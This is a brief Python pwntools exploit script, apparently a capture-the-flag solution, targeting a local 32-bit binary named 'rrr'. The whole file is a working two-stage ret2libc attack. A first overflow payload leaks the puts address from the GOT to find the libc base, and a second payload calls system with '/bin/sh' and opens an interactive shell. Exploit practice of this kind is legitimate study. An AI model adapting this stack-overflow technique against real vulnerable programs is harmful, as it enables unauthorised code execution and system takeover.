from pwn import *
context.log_level = "debug"
p = process("./rrr")
elf = ELF("./rrr")
libc = elf.libc

vuln = 0x080485A5

payload = "a" * 0x2f + "\x00"
payload += 'b' * 4 + p32(elf.plt["puts"]) + p32(vuln) + p32(elf.got["puts"])
p.sendafter(">\n" , payload)
puts_addr = u32(p.recv(4))
libc.address = puts_addr - libc.sym["puts"]
log.info(hex(libc.address))
payload = "a" * 0x2f + "\x00"
payload += 'b' * 4 + p32(libc.sym["system"]) + p32(vuln) + p32(libc.search("/bin/sh").next())
p.sendafter(">\n" , payload)
p.interactive()